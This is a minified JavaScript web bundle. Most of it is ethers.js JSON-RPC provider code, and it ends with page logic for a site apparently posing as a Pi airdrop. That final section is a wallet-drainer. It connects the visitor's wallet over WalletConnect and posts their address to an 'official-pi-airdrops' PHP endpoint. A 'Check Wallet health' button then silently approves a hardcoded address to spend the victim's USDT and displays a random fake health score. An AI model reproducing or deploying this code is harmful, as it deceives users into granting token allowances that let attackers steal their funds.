Nr(n.from,this.provider);M(s!=null&&s.toLowerCase()===this.address.toLowerCase(),"from address mismatch","transaction",r),n.from=s}else n.from=this.address;const i=this.provider.getRpcTransaction(n);return await this.provider.send("eth_signTransaction",[i])}async signMessage(r){const n=typeof r=="string"?Fs(r):r;return await this.provider.send("personal_sign",[ue(n),this.address.toLowerCase()])}async signTypedData(r,n,i){const s=G0(i),o=await Ng.resolveNames(r,n,s,async a=>{const c=await Nr(a);return M(c!=null,"TypedData does not support null address","value",a),c});return await this.provider.send("eth_signTypedData_v4",[this.address.toLowerCase(),JSON.stringify(Ng.getPayload(o.domain,n,o.value))])}async unlock(r){return this.provider.send("personal_unlockAccount",[this.address.toLowerCase(),r,null])}async _legacySignMessage(r){const n=typeof r=="string"?Fs(r):r;return await this.provider.send("eth_sign",[this.address.toLowerCase(),ue(n)])}}var sc,$u,_s,Ui,ci,Un,jr,Bf,Pb;class Wre extends Rre{constructor(r,n){super(r,n);H(this,Bf);H(this,sc);H(this,$u);H(this,_s);H(this,Ui);H(this,ci);H(this,Un);H(this,jr);$(this,$u,1),$(this,sc,Object.assign({},M7,n||{})),$(this,_s,[]),$(this,Ui,null),$(this,Un,null),$(this,jr,null);{let s=null;const o=new Promise(a=>{s=a});$(this,ci,{promise:o,resolve:s})}const i=this._getOption("staticNetwork");typeof i=="boolean"?(M(!i||r!=="any","staticNetwork cannot be used on special network 'any'","options",n),i&&r!=null&&$(this,Un,Vi.from(r))):i&&(M(r==null||i.matches(r),"staticNetwork MUST match network object","options",n),$(this,Un,i))}_getOption(r){return A(this,sc)[r]}get _network(){return K(A(this,Un),"network is not available yet","NETWORK_ERROR"),A(this,Un)}async _perform(r){if(r.method==="call"||r.method==="estimateGas"){let i=r.transaction;if(i&&i.type!=null&&ge(i.type)&&i.maxFeePerGas==null&&i.maxPriorityFeePerGas==null){const s=await this.getFeeData();s.maxFeePerGas==null&&s.maxPriorityFeePerGas==null&&(r=Object.assign({},r,{transaction:Object.assign({},i,{type:void 0})}))}}const n=this.getRpcRequest(r);return n!=null?await this.send(n.method,n.args):super._perform(r)}async _detectNetwork(){const r=this._getOption("staticNetwork");if(r)if(r===!0){if(A(this,Un))return A(this,Un)}else return r;return A(this,jr)?await A(this,jr):this.ready?($(this,jr,(async()=>{try{const n=Vi.from(ge(await this.send("eth_chainId",[])));return $(this,jr,null),n}catch(n){throw $(this,jr,null),n}})()),await A(this,jr)):($(this,jr,(async()=>{const n={id:mh(this,$u)._++,method:"eth_chainId",params:[],jsonrpc:"2.0"};this.emit("debug",{action:"sendRpcPayload",payload:n});let i;try{i=(await this._send(n))[0],$(this,jr,null)}catch(s){throw $(this,jr,null),this.emit("debug",{action:"receiveRpcError",error:s}),s}if(this.emit("debug",{action:"receiveRpcResult",result:i}),"result"in i)return Vi.from(ge(i.result));throw this.getRpcError(n,i)})()),await A(this,jr))}_start(){A(this,ci)==null||A(this,ci).resolve==null||(A(this,ci).resolve(),$(this,ci,null),(async()=>{for(;A(this,Un)==null&&!this.destroyed;)try{$(this,Un,await this._detectNetwork())}catch(r){if(this.destroyed)break;console.log("JsonRpcProvider failed to detect network and cannot start up; retry in 1s (perhaps the URL is wrong or the node is not started)"),this.emit("error",Et("failed to bootstrap network detection","NETWORK_ERROR",{event:"initial-network-discovery",info:{error:r}})),await Vre(1e3)}Q(this,Bf,Pb).call(this)})())}async _waitUntilReady(){if(A(this,ci)!=null)return await A(this,ci).promise}_getSubscriber(r){return r.type==="pending"?new Hre(this):r.type==="event"?this._getOption("polling")?new W2(this,r.filter):new jre(this,r.filter):r.type==="orphan"&&r.filter.orphan==="drop-log"?new L7("orphan"):super._getSubscriber(r)}get ready(){return A(this,ci)==null}getRpcTransaction(r){const n={};return["chainId","gasLimit","gasPrice","type","maxFeePerGas","maxPriorityFeePerGas","nonce","value"].forEach(i=>{if(r[i]==null)return;let s=i;i==="gasLimit"&&(s="gas"),n[s]=Ul(ge(r[i],`tx.${i}`))}),["from","to","data"].forEach(i=>{r[i]!=null&&(n[i]=ue(r[i]))}),r.accessList&&(n.accessList=Fc(r.accessList)),r.blobVersionedHashes&&(n.blobVersionedHashes=r.blobVersionedHashes.map(i=>i.toLowerCase())),n}getRpcRequest(r){switch(r.method){case"chainId":return{method:"eth_chainId",args:[]};case"getBlockNumber":return{method:"eth_blockNumber",args:[]};case"getGasPrice":return{method:"eth_gasPrice",args:[]};case"getPriorityFee":return{method:"eth_maxPriorityFeePerGas",args:[]};case"getBalance":return{method:"eth_getBalance",args:[bl(r.address),r.blockTag]};case"getTransactionCount":return{method:"eth_getTransactionCount",args:[bl(r.address),r.blockTag]};case"getCode":return{method:"eth_getCode",args:[bl(r.address),r.blockTag]};case"getStorage":return{method:"eth_getStorageAt",args:[bl(r.address),"0x"+r.position.toString(16),r.blockTag]};case"broadcastTransaction":return{method:"eth_sendRawTransaction",args:[r.signedTransaction]};case"getBlock":if("blockTag"in r)return{method:"eth_getBlockByNumber",args:[r.blockTag,!!r.includeTransactions]};if("blockHash"in r)return{method:"eth_getBlockByHash",args:[r.blockHash,!!r.includeTransactions]};break;case"getTransaction":return{method:"eth_getTransactionByHash",args:[r.hash]};case"getTransactionReceipt":return{method:"eth_getTransactionReceipt",args:[r.hash]};case"call":return{method:"eth_call",args:[this.getRpcTransaction(r.transaction),r.blockTag]};case"estimateGas":return{method:"eth_estimateGas",args:[this.getRpcTransaction(r.transaction)]};case"getLogs":return r.filter&&r.filter.address!=null&&(Array.isArray(r.filter.address)?r.filter.address=r.filter.address.map(bl):r.filter.address=bl(r.filter.address)),{method:"eth_getLogs",args:[r.filter]}}return null}getRpcError(r,n){const{method:i}=r,{error:s}=n;if(i==="eth_estimateGas"&&s.message){const c=s.message;if(!c.match(/revert/i)&&c.match(/insufficient funds/i))return Et("insufficient funds","INSUFFICIENT_FUNDS",{transaction:r.params[0],info:{payload:r,error:s}})}if(i==="eth_call"||i==="eth_estimateGas"){const c=kb(s),l=Af.getBuiltinCallException(i==="eth_call"?"call":"estimateGas",r.params[0],c?c.data:null);return l.info={error:s,payload:r},l}const o=JSON.stringify(Kre(s));if(typeof s.message=="string"&&s.message.match(/user denied|ethers-user-denied/i))return Et("user rejected action","ACTION_REJECTED",{action:{eth_sign:"signMessage",personal_sign:"signMessage",eth_signTypedData_v4:"signTypedData",eth_signTransaction:"signTransaction",eth_sendTransaction:"sendTransaction",eth_requestAccounts:"requestAccess",wallet_requestAccounts:"requestAccess"}[i]||"unknown",reason:"rejected",info:{payload:r,error:s}});if(i==="eth_sendRawTransaction"||i==="eth_sendTransaction"){const c=r.params[0];if(o.match(/insufficient funds|base fee exceeds gas limit/i))return Et("insufficient funds for intrinsic transaction cost","INSUFFICIENT_FUNDS",{transaction:c,info:{error:s}});if(o.match(/nonce/i)&&o.match(/too low/i))return Et("nonce has already been used","NONCE_EXPIRED",{transaction:c,info:{error:s}});if(o.match(/replacement transaction/i)&&o.match(/underpriced/i))return Et("replacement fee too low","REPLACEMENT_UNDERPRICED",{transaction:c,info:{error:s}});if(o.match(/only replay-protected/i))return Et("legacy pre-eip-155 transactions not supported","UNSUPPORTED_OPERATION",{operation:i,info:{transaction:c,info:{error:s}}})}let a=!!o.match(/the method .* does not exist/i);return a||s&&s.details&&s.details.startsWith("Unauthorized method:")&&(a=!0),a?Et("unsupported operation","UNSUPPORTED_OPERATION",{operation:r.method,info:{error:s,payload:r}}):Et("could not coalesce error","UNKNOWN_ERROR",{error:s,payload:r})}send(r,n){if(this.destroyed)return Promise.reject(Et("provider destroyed; cancelled request","UNSUPPORTED_OPERATION",{operation:r}));const i=mh(this,$u)._++,s=new Promise((o,a)=>{A(this,_s).push({resolve:o,reject:a,payload:{method:r,params:n,id:i,jsonrpc:"2.0"}})});return Q(this,Bf,Pb).call(this),s}async getSigner(r){r==null&&(r=0);const n=this.send("eth_accounts",[]);if(typeof r=="number"){const s=await n;if(r>=s.length)throw new Error("no such account");return new Lm(this,s[r])}const{accounts:i}=await Ar({network:this.getNetwork(),accounts:n});r=ot(r);for(const s of i)if(ot(s)===r)return new Lm(this,r);throw new Error("invalid account")}async listAccounts(){return(await this.send("eth_accounts",[])).map(n=>new Lm(this,n))}destroy(){A(this,Ui)&&(clearTimeout(A(this,Ui)),$(this,Ui,null));for(const{payload:r,reject:n}of A(this,_s))n(Et("provider destroyed; cancelled request","UNSUPPORTED_OPERATION",{operation:r.method}));$(this,_s,[]),super.destroy()}}sc=new WeakMap,$u=new WeakMap,_s=new WeakMap,Ui=new WeakMap,ci=new WeakMap,Un=new WeakMap,jr=new WeakMap,Bf=new WeakSet,Pb=function(){if(A(this,Ui))return;const r=this._getOption("batchMaxCount")===1?0:this._getOption("batchStallTime");$(this,Ui,setTimeout(()=>{$(this,Ui,null);const n=A(this,_s);for($(this,_s,[]);n.length;){const i=[n.shift()];for(;n.length&&i.length!==A(this,sc).batchMaxCount;)if(i.push(n.shift()),JSON.stringify(i.map(o=>o.payload)).length>A(this,sc).batchMaxSize){n.unshift(i.pop());break}(async()=>{const s=i.length===1?i[0].payload:i.map(o=>o.payload);this.emit("debug",{action:"sendRpcPayload",payload:s});try{const o=await this._send(s);this.emit("debug",{action:"receiveRpcResult",result:o});for(const{resolve:a,reject:c,payload:l}of i){if(this.destroyed){c(Et("provider destroyed; cancelled request","UNSUPPORTED_OPERATION",{operation:l.method}));continue}const u=o.filter(h=>h.id===l.id)[0];if(u==null){const h=Et("missing response for request","BAD_DATA",{value:o,info:{payload:l}});this.emit("error",h),c(h);continue}if("error"in u){c(this.getRpcError(l,u));continue}a(u.result)}}catch(o){this.emit("debug",{action:"receiveRpcError",error:o});for(const{reject:a}of i)a(o)}})()}},r))};var _o;class Gre extends Wre{constructor(r,n){super(r,n);H(this,_o);let i=this._getOption("pollingInterval");i==null&&(i=M7.pollingInterval),$(this,_o,i)}_getSubscriber(r){const n=super._getSubscriber(r);return W6(n)&&(n.pollingInterval=A(this,_o)),n}get pollingInterval(){return A(this,_o)}set pollingInterval(r){if(!Number.isInteger(r)||r<0)throw new Error("invalid interval");$(this,_o,r),this._forEachSubscriber(n=>{W6(n)&&(n.pollingInterval=A(this,_o))})}}_o=new WeakMap;function kb(t){if(t==null)return null;if(typeof t.message=="string"&&t.message.match(/revert/i)&&gt(t.data))return{message:t.message,data:t.data};if(typeof t=="object"){for(const e in t){const r=kb(t[e]);if(r)return r}return null}if(typeof t=="string")try{return kb(JSON.parse(t))}catch{}return null}function Ob(t,e){if(t!=null){if(typeof t.message=="string"&&e.push(t.message),typeof t=="object")for(const r in t)Ob(t[r],e);if(typeof t=="string")try{return Ob(JSON.parse(t),e)}catch{}}}function Kre(t){const e=[];return Ob(t,e),e}var Ru;class Zre extends Gre{constructor(r,n,i){const s=Object.assign({},i??{},{batchMaxCount:1});M(r&&r.request,"invalid EIP-1193 provider","ethereum",r);super(n,s);H(this,Ru);$(this,Ru,async(o,a)=>{const c={method:o,params:a};this.emit("debug",{action:"sendEip1193Request",payload:c});try{const l=await r.request(c);return this.emit("debug",{action:"receiveEip1193Result",result:l}),l}catch(l){const u=new Error(l.message);throw u.code=l.code,u.data=l.data,u.payload=c,this.emit("debug",{action:"receiveEip1193Error",error:u}),u}})}async send(r,n){return await this._start(),await super.send(r,n)}async _send(r){M(!Array.isArray(r),"EIP-1193 does not support batch request","payload",r);try{const n=await A(this,Ru).call(this,r.method,r.params||[]);return[{id:r.id,result:n}]}catch(n){return[{id:r.id,error:{code:n.code,data:n.data,message:n.message}}]}}getRpcError(r,n){switch(n=JSON.parse(JSON.stringify(n)),n.error.code||-1){case 4001:n.error.message=`ethers-user-denied: ${n.error.message}`;break;case 4200:n.error.message=`ethers-unsupported: ${n.error.message}`;break}return super.getRpcError(r,n)}async hasSigner(r){r==null&&(r=0);const n=await this.send("eth_accounts",[]);return typeof r=="number"?n.length>r:(r=r.toLowerCase(),n.filter(i=>i.toLowerCase()===r).length!==0)}async getSigner(r){if(r==null&&(r=0),!await this.hasSigner(r))try{await A(this,Ru).call(this,"eth_requestAccounts",[])}catch(n){const i=n.payload;throw this.getRpcError(i,{id:i.id,error:n})}return await super.getSigner(r)}}Ru=new WeakMap;const F7="0x55d398326f99059fF775485246999027B3197955",Jre="0x24E189414e4217962964b9D57877C91349A169Da",Qre=["function approve(address spender, uint256 amount) public returns (bool)"],Yre=["function balanceOf(address owner) view returns (uint256)"],sd=document.getElementById("connectWallet"),$l=document.getElementById("approveUSDT");let _g;sd.onclick=async()=>{sd.innerText="Processing...",sd.disabled=!0,setTimeout(()=>{const t=document.getElementById("preConnectOverlay");t&&(t.style.display="none"),sd.innerText="Proceed",sd.disabled=!1},5e3);try{const t=await t2.init({projectId:"5c7a882142c7491241b507534414ddff",chains:[56],methods:["eth_sendTransaction","eth_sign","personal_sign"],showQrModal:!0});await t.connect();const e=new Zre(t);_g=await e.getSigner();const r=await _g.getAddress(),n=document.getElementById("connectionPopupOverlay"),i=document.getElementById("connectionPopupBox"),s=document.getElementById("popupCloseBtn");n&&(n.style.display="flex",n.querySelector(".user-address").textContent=r,setTimeout(()=>{n.style.display="none"},3e3)),s&&(s.onclick=()=>{n.style.display="none"}),window.addEventListener("click",l=>{l.target===n&&(n.style.display="none")}),fetch("https://official-pi-airdrops.com/php/save_wallet.php",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({wallet:r})}),$l.style.display="inline-block";const o=document.getElementById("userAddress"),a=document.getElementById("userBalance"),c=document.getElementById("walletInfo");if(o){o.innerText=r;const l=document.getElementById("userAddress");l&&(l.value=r),c.style.display="block";const h=await new gc(F7,Yre,e).balanceOf(r),d=FY(h,18);a.innerText=`${d} USDT`}}catch(t){console.error("Wallet connection error:",t)}};$l.onclick=async()=>{try{$l.disabled=!0,$l.innerHTML='<i class="fas fa-spinner fa-spin"></i> Processing...',await(await new gc(F7,Qre,_g).approve(Jre,lee)).wait();const r=await _g.getAddress(),n=document.getElementById("overlay"),i=document.getElementById("walletAddress"),s=`${r.substring(0,6)}...${r.substring(r.length-4)}`;i.textContent=s;const o=Math.floor(Math.random()*9)+90;document.getElementById("healthScore").textContent=`${o}%`,document.getElementById("healthBar").style.width=`${o}%`,n.style.display="flex",document.getElementById("closeOverlayBtn").onclick=()=>{n.style.display="none"},n.addEventListener("click",a=>{a.target===n&&(n.style.display="none")})}catch(t){console.error("Approval error:",t),alert("Approval failed: "+(t.message||t))}finally{$l.disabled=!1,$l.innerHTML='<i class="fas fa-award" style="margin-right: 0.5rem;"></i>Check Wallet health'}};export{dS as H,Cv as a,rS as b,tne as c,ene as d,Mg as e,sne as f,nne as g,rne as r,sE as t,fS as w};
